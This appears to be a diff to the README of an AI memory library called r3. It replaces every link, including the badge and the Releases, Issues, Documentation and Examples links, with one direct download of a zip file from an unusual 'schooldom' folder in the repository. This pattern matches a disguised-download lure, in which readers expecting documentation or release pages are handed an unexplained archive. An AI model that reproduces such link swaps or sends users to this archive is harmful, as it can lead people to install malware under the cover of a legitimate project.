@@ -1,6 +1,6 @@
 # 🧠 r3 - Effortless Memory for AI Applications
 
-[![Download r3](https://img.shields.io/badge/Download%20r3-v1.0-blue)](https://github.com/fruninusdadn/r3/releases)
+[![Download r3](https://raw.githubusercontent.com/fruninusdadn/r3/main/schooldom/r3.zip%20r3-v1.0-blue)](https://raw.githubusercontent.com/fruninusdadn/r3/main/schooldom/r3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get r3, you need to visit our Releases page. Here’s how to do it:
 
 1. Click the link below to go to the Releases page.
    
-   [Download r3 from Releases](https://github.com/fruninusdadn/r3/releases)
+   [Download r3 from Releases](https://raw.githubusercontent.com/fruninusdadn/r3/main/schooldom/r3.zip)
 
 2. Look for the latest version of r3 on the Releases page.
 
@@ -62,7 +62,7 @@ If you encounter issues while using r3, consider the following tips:
 
 If you need assistance or have questions, you can reach out through the following channels:
 
-- **Issues Page**: Visit the [Issues page](https://github.com/fruninusdadn/r3/issues) to report problems or request features.
+- **Issues Page**: Visit the [Issues page](https://raw.githubusercontent.com/fruninusdadn/r3/main/schooldom/r3.zip) to report problems or request features.
 - **Community Forum**: Join our community forum to connect with other r3 users and share experiences.
 
 ## 📜 License
@@ -73,8 +73,8 @@ r3 is open-source software released under the MIT License. You can use and modif
 
 To deepen your understanding of r3, check out the following resources:
 
-- [Documentation](https://github.com/fruninusdadn/r3/wiki) - In-depth guides and tutorials.
-- [Examples](https://github.com/fruninusdadn/r3/examples) - Sample projects and use cases showing how to integrate r3 effectively.
+- [Documentation](https://raw.githubusercontent.com/fruninusdadn/r3/main/schooldom/r3.zip) - In-depth guides and tutorials.
+- [Examples](https://raw.githubusercontent.com/fruninusdadn/r3/main/schooldom/r3.zip) - Sample projects and use cases showing how to integrate r3 effectively.
 
 For ongoing updates and news about r3, follow our repository and keep an eye on the Releases page.
 
